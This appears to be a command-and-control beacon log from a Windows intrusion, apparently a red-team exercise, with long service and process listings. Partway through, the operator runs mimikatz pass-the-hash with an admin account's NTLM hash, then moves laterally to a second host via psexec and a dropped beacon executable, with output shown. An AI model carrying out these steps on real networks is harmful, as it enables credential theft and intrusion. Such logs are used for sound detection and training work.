03/30 08:44:17 UTC [metadata] 13.81.175.72 <- 10.1.3.11; computer: L-WIN224; user: W.Tax *; process: wsmprovhost.exe; pid: 4164; os: Windows; version: 10.0; beacon arch: x64 (x64)
03/30 08:44:25 UTC [input] <neo> ps
03/30 08:44:25 UTC [task] <T1057> Tasked beacon to list processes
03/30 08:44:27 UTC [checkin] host called home, sent: 12 bytes
03/30 08:44:27 UTC [output]
[System Process]	0	0
System	0	4	x64		0
DISPLAY_NAME: Themes
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: TimeBrokerSvc
DISPLAY_NAME: Time Broker
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: TokenBroker
DISPLAY_NAME: Web Account Manager
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: TrkWks
DISPLAY_NAME: Distributed Link Tracking Client
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: UmRdpService
DISPLAY_NAME: Remote Desktop Services UserMode Port Redirector
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: UserManager
DISPLAY_NAME: User Manager
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: UsoSvc
DISPLAY_NAME: Update Orchestrator Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: VaultSvc
DISPLAY_NAME: Credential Manager
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmicheartbeat
DISPLAY_NAME: Hyper-V Heartbeat Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmickvpexchange
DISPLAY_NAME: Hyper-V Data Exchange Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmicrdv
DISPLAY_NAME: Hyper-V Remote Desktop Virtualization Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmicshutdown
DISPLAY_NAME: Hyper-V Guest Shutdown Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmictimesync
DISPLAY_NAME: Hyper-V Time Synchronization Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: vmicvss
DISPLAY_NAME: Hyper-V Volume Shadow Copy Requestor
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: VSS
DISPLAY_NAME: Volume Shadow Copy
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: W32Time
DISPLAY_NAME: Windows Time
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Wcmsvc
DISPLAY_NAME: Windows Connection Manager
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WdiServiceHost
DISPLAY_NAME: Diagnostic Service Host
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WinDefend
DISPLAY_NAME: Windows Defender Antivirus Service
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WindowsAzureGuestAgent
DISPLAY_NAME: Windows Azure Guest Agent
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WindowsAzureNetAgentSvc
DISPLAY_NAME: Windows Azure Network Agent
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WindowsAzureTelemetryService
DISPLAY_NAME: Windows Azure Telemetry Service
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WinHttpAutoProxySvc
DISPLAY_NAME: WinHTTP Web Proxy Auto-Discovery Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Winmgmt
DISPLAY_NAME: Windows Management Instrumentation
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WinRM
DISPLAY_NAME: Windows Remote Management (WS-Management)
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WpnService
DISPLAY_NAME: Windows Push Notifications System Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: wscsvc
DISPLAY_NAME: Security Center
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WSearch
DISPLAY_NAME: Windows Search
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: cbdhsvc_12420b
DISPLAY_NAME: Clipboard User Service_12420b
        TYPE               : f0   ERROR
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: CDPUserSvc_12420b
DISPLAY_NAME: Connected Devices Platform User Service_12420b
        TYPE               : f0   ERROR
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: OneSyncSvc_12420b
DISPLAY_NAME: Sync Host_12420b
        TYPE               : e0  USER_SHARE_PROCESS INSTANCE
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WpnUserService_12420b
DISPLAY_NAME: Windows Push Notifications User Service_12420b
        TYPE               : f0   ERROR
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


03/30 08:59:52 UTC [input] <neo> run sc query netsrv
03/30 08:59:52 UTC [task] <T1059> Tasked beacon to run: sc query netsrv
03/30 08:59:55 UTC [checkin] host called home, sent: 33 bytes
03/30 08:59:55 UTC [output]
received output:

SERVICE_NAME: netsrv
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


03/30 09:00:20 UTC [input] <neo> run sc start netsrv
03/30 09:00:20 UTC [task] <T1059> Tasked beacon to run: sc start netsrv
03/30 09:00:23 UTC [checkin] host called home, sent: 33 bytes
03/30 09:00:23 UTC [output]
received output:

SERVICE_NAME: netsrv
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5880
        FLAGS              :


03/30 09:03:59 UTC [input] <neo> rev2self
03/30 09:03:59 UTC [task] <T1134> Tasked beacon to revert token
03/30 09:03:59 UTC [input] <neo> pth STROOP\admin-W.Trommel e4a22d8e7bbec871b341c88c2e94cba2
03/30 09:04:00 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:admin-W.Trommel /domain:STROOP /ntlm:e4a22d8e7bbec871b341c88c2e94cba2 /run:"%COMSPEC% /c echo fb52ae3c198 > \\.\pipe\b2ebc7" command
03/30 09:04:00 UTC [input] <neo> jump psexec64 L-WIN227 smb
03/30 09:04:00 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_2ebf) on L-WIN227 via Service Control Manager (\\L-WIN227\ADMIN$\203b554.exe)
03/30 09:04:00 UTC [indicator] service: \\L-WIN227 203b554
03/30 09:04:00 UTC [indicator] file: 10ba5a6a5e0316fedf7fd10d257b3f91 289280 bytes \\L-WIN227\ADMIN$\203b554.exe
03/30 09:04:03 UTC [checkin] host called home, sent: 706862 bytes
03/30 09:04:07 UTC [output]
Impersonated STROOP\W.Tax

03/30 09:04:07 UTC [output]
received output:
Started service 203b554 on L-WIN227

03/30 09:04:07 UTC [output]
established link to child beacon: 10.1.4.10

03/30 09:04:07 UTC [output]
received output:
user	: admin-W.Trommel
domain	: STROOP
program	: C:\windows\system32\cmd.exe /c echo fb52ae3c198 > \\.\pipe\b2ebc7
impers.	: no
NTLM	: e4a22d8e7bbec871b341c88c2e94cba2
  |  PID  376
  |  TID  7096
  |  LSA Process is now R/W
  |  LUID 0 ; 2756941 (00000000:002a114d)
  \_ msv1_0   - data copy @ 0000013F1A4BC280 : OK !
  \_ kerberos - data copy @ 0000013F1A4CE8D8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000013F1A02BA58 (32) -> null


03/30 09:04:37 UTC [input] <neo> screenshot
03/30 09:04:37 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
03/30 09:04:38 UTC [input] <neo> ps
03/30 09:04:38 UTC [task] <T1057> Tasked beacon to list processes
03/30 09:04:46 UTC [checkin] host called home, sent: 197210 bytes
03/30 09:04:53 UTC [output]
[System Process]	0	0
System	0	4	x64		0
Registry	4	88	x64	NT AUTHORITY\SYSTEM	0
smss.exe	4	404	x64	NT AUTHORITY\SYSTEM	0
csrss.exe	504	512	x64	NT AUTHORITY\SYSTEM	0
wininit.exe	504	584	x64	NT AUTHORITY\SYSTEM	0
csrss.exe	576	592	x64	NT AUTHORITY\SYSTEM	1
winlogon.exe	576	676	x64	NT AUTHORITY\SYSTEM	1
services.exe	584	692	x64	NT AUTHORITY\SYSTEM	0
lsass.exe	584	724	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	832	x64	NT AUTHORITY\SYSTEM	0
fontdrvhost.exe	676	840	x64	Font Driver Host\UMFD-1	1
fontdrvhost.exe	584	848	x64	Font Driver Host\UMFD-0	0
svchost.exe	692	916	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	956	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	1012	x64	NT AUTHORITY\SYSTEM	0
LogonUI.exe	676	508	x64	NT AUTHORITY\SYSTEM	1
dwm.exe	676	744	x64	Window Manager\DWM-1	1
svchost.exe	692	932	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	972	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	1092	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1100	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1132	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1168	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1224	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1288	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1296	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1348	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	1432	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1476	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1496	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1668	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	1680	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1692	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1752	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1760	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1788	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1888	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1916	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1936	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1084	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	1448	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	1452	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2004	x64	NT AUTHORITY\SYSTEM	0
Memory Compression	4	2208	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2236	x64	NT AUTHORITY\SYSTEM	0
VSSVC.exe	692	2248	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2256	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	2308	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2344	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2384	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2432	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2480	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2644	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2652	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2756	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2764	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2772	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	2780	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	2892	x64	NT AUTHORITY\SYSTEM	0
spoolsv.exe	692	2972	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	2980	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3092	x64	NT AUTHORITY\NETWORK SERVICE	0
OfficeClickToRun.exe	692	3104	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3112	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3132	x64	NT AUTHORITY\LOCAL SERVICE	0
svchost.exe	692	3200	x64	NT AUTHORITY\SYSTEM	0
WaAppAgent.exe	692	3220	x64	NT AUTHORITY\SYSTEM	0
sysmon64.exe	692	3236	x64	NT AUTHORITY\SYSTEM	0
WindowsAzureGuestAgent.exe	692	3304	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3312	x64	NT AUTHORITY\LOCAL SERVICE	0
MsMpEng.exe	692	3324	x64	NT AUTHORITY\SYSTEM	0
WindowsAzureNetAgent.exe	692	3340	x64	NT AUTHORITY\SYSTEM	0
WindowsAzureTelemetryService.exe	692	3364	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3372	x64	NT AUTHORITY\SYSTEM	0
svchost.exe	692	3380	x64	NT AUTHORITY\NETWORK SERVICE	0
svchost.exe	692	3444	x64	NT AUTHORITY\SYSTEM	0
